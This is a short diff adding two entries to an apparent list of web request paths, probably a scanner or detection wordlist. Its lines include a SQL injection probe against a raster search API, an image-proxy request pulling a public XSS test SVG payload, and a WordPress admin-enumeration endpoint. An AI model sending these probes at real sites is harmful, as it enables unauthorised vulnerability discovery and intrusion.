@@ -260,3 +260,5 @@
 /api/raster/search/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--
 /wp-json/gravitysmtp/v1/tests/mock-data?page=gravitysmtp-settings
 /api/setup-complete
+/_image?href=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg&f=svg
+/wp-json/mrm/v1/wp/admins?term=@
